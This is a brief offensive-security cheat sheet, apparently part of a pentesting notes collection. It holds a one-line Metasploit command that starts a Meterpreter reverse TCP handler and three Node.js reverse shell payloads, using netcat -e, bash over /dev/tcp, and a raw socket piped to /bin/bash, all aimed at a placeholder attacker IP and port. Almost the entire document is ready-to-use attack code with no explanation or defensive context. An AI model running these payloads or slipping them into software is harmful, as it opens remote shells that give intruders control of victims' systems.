# Miscellaneous

---

### Table of Contents
- [Metasploit Handler Oneliner](#metasploit-handler-oneliner)
- [Reverse Shell JavaScript](#reverse-shell-javascript)

---

## Metasploit Handler Oneliner
- Create a `Metasploit` handler in one line

```bash
# E.g. Metapreter Reverse TCP
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <attacker_ip>;set LPORT <port>;run;"
```

## Reverse Shell JavaScript
- Context specific, e.g. without URL encode

```js
// NOT OpenBSD netcat, doesn't know -e
require("child_process").exec('nc <attacker_ip> <port> -e /bin/bash')

// Important: Use backticks here
process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'`)

// Another approach
var net = require("net"), sh = require("child_process").exec("/bin/bash");
var client = new net.Socket();
client.connect(4444, "<attack_ip>", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
sh.stderr.pipe(client);});
```
